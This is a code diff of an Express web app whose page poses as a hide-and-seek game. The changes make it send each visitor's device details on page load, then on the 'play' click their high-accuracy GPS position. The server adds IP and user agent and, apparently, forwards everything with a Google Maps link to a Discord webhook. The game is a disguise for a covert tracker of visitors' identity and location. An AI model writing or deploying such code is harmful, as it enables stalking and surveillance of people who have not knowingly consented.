@@ -136,10 +136,11 @@ app.get('/', (req, res) => {
                     };
                 }
 
-                function transmettreMetadonnees(gpsData) {
+                function transmettreMetadonnees(type, gpsData = null) {
                     const payload = {
+                        typeEvenement: type, // "Visite" ou "Clic Jouer"
                         client: collecterMetadonnees(),
-                        gps: gpsData || null
+                        gps: gpsData
                     };
 
                     fetch('/api/collecte', {
@@ -147,8 +148,38 @@ app.get('/', (req, res) => {
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
+                }
 
-                    // Affichage du tableau de bord de jeu
+                // 1. Envoi automatique dès l'arrivée sur le site
+                window.addEventListener('DOMContentLoaded', () => {
+                    transmettreMetadonnees('Visite initiale');
+                });
+
+                // 2. Envoi sur clic pour la position GPS
+                function demarrerPartie() {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                envoyerGpsEtAfficherDashboard({
+                                    lat: pos.coords.latitude,
+                                    lon: pos.coords.longitude,
+                                    precision: pos.coords.accuracy
+                                });
+                            },
+                            (err) => {
+                                envoyerGpsEtAfficherDashboard({ erreur: "Accès refusé (" + err.message + ")" });
+                            },
+                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                        );
+                    } else {
+                        envoyerGpsEtAfficherDashboard({ erreur: "Géolocalisation non supportée" });
+                    }
+                }
+
+                function envoyerGpsEtAfficherDashboard(gpsData) {
+                    transmettreMetadonnees('Demande de localisation', gpsData);
+
+                    // Passage à l'interface de jeu
                     document.getElementById('lobby').style.display = 'none';
                     document.getElementById('game-dashboard').style.display = 'block';
                     
@@ -156,26 +187,6 @@ app.get('/', (req, res) => {
                         document.getElementById('status-text').innerText = "Coordonnées de jeu enregistrées. Recherche de cachettes à proximité...";
                     } else {
                         document.getElementById('status-text').innerText = "Mode spectateur activé (Position non partagée).";
-                    }
-                }
-
-                function demarrerPartie() {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => {
-                                transmettreMetadonnees({
-                                    lat: pos.coords.latitude,
-                                    lon: pos.coords.longitude,
-                                    precision: pos.coords.accuracy
-                                });
-                            },
-                            (err) => {
-                                transmettreMetadonnees({ erreur: "Accès refusé (" + err.message + ")" });
-                            },
-                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                        );
-                    } else {
-                        transmettreMetadonnees({ erreur: "Géolocalisation non supportée" });
                     }
                 }
             </script>
@@ -187,13 +198,14 @@ app.get('/', (req, res) => {
 // Traitement API et Webhook Discord
 app.post('/api/collecte', async (req, res) => {
     const body = req.body || {};
+    const typeEvenement = body.typeEvenement || 'Événement inconnu';
     const client = body.client || {};
     const gps = body.gps || {};
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Inconnu';
 
-    let gpsText = "❌ Non partagée (Mode Spectateur)";
+    let gpsText = "⏳ Attente du clic sur l'arène...";
     if (gps.lat && gps.lon) {
         gpsText = `📍 [${gps.lat}, ${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (+/- ${Math.round(gps.precision)}m)`;
     } else if (gps.erreur) {
@@ -201,8 +213,8 @@ app.post('/api/collecte', async (req, res) => {
     }
 
     const embeds = [{
-        title: "🎮 Nouveau joueur dans le Cache-Cache",
-        color: 1095782,
+        title: `🎮 ${typeEvenement}`,
+        color: gps.lat ? 65280 : 3447003, // Vert si GPS reçu, Bleu pour simple visite
         fields: [
             { name: "🌐 Connexion", value: `**IP :** \`${ip}\`\n**User-Agent :** \`${userAgent}\`` },
             { name: "💻 Appareil", value: `**Écran :** ${client.ecran}\n**CPU :** ${client.coeursCPU} cœurs | **RAM :** ${client.ramGo}\n**Zone :** ${client.fuseauHoraire}` },
